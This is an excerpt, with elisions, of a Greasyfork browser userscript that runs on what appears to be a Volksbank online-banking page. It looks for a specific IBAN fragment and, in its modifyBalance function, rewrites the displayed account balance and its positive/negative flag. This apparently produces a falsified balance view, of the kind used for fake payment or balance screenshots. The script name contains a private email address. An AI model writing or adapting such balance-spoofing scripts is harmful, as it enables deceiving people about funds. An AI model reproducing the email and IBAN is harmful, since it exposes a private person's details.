// ==UserScript==
// @name         Ed 4Rec  post.kreuzmoos@t-online.de
...
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/542725/Ed%204Rec%20%20postkreuzmoos%40t-onlinede.user.js
// @updateURL https://update.greasyfork.org/scripts/542725/Ed%204Rec%20%20postkreuzmoos%40t-onlinede.meta.js
// ==/UserScript==
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    // Define the target text content to search for (case and whitespace insensitive)
       var targetTextContent1 = "DE82 6809 2000";
       var targetTextContent2 = " 0034 1465 00";
    ...
    function modifyBalance() {
        ...
        if (parentElement) {
            ...
            if (balanceElement) {
                ...
                // Update the data-positive attribute based on the new balance sign
                parentElement.parentElement.setAttribute('data-positive', numericValue >= 0 ? '1' : '0');
